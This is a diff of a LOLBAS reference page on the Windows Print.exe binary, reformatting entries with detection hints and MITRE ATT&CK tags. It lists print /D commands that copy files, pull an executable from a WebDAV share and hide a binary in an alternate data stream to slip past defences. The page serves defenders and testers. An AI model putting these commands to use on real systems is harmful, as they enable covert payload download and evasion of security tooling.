@@ -28,18 +28,22 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Print/#copy">Copy</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Print/#ads">Alternate data streams</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Print/#ads">Alternate data streams</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Print/#copy">Copy</a></li>
+	
 </ul>
 
+	
+
 <p>Used by Windows to send files to the printer</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -53,108 +57,90 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://twitter.com/Oddvarmoe/status/985518877076541440">https://twitter.com/Oddvarmoe/status/985518877076541440</a></li>
+	<a href="https://twitter.com/Oddvarmoe/status/985518877076541440">https://twitter.com/Oddvarmoe/status/985518877076541440</a>
+	<br>
 	
-	<li><a href="https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410">https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410</a></li>
+	<a href="https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410">https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a </li>
+	Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li>Print.exe getting files from internet</li>
+	Print.exe getting files from internet
+	<br>
 	
-	<li>Print.exe creating executable files on disk</li>
+	Print.exe creating executable files on disk
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="copy" class="function-name">Copy</h2>
-
-<p>The LOLBAS can copy file.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Copy FileToCopy.exe to the target C:\ADS\CopyOfFile.exe</p>
-
-		Usecase:Copy files
-        <pre><code>print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.</p>
-
-		Usecase:Copy/Download file from remote server
-        <pre><code>print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="ads" class="function-name">Alternate data streams</h2>
-
-<p>The LOLBAS can write or read alternate data streams.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Copy file.exe into the Alternate Data Stream (ADS) of file.txt.</p>
-
+	
+<h2 id="ads" class ="function-name">Alternate data streams</h2>
+	
+		Copy file.exe into the Alternate Data Stream (ADS) of file.txt.
+		<br>
+		<pre><code>print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe</code></pre>
 		Usecase:Hide binary file in alternate data stream to potentially bypass defensive counter measures
-        <pre><code>print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
+	
+<h2 id="copy" class ="function-name">Copy</h2>
+	
+		Copy FileToCopy.exe to the target C:\ADS\CopyOfFile.exe
+		<br>
+		<pre><code>print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe</code></pre>
+		Usecase:Copy files
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.
+		<br>
+		<pre><code>print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe</code></pre>
+		Usecase:Copy/Download file from remote server
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1105">T1105</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
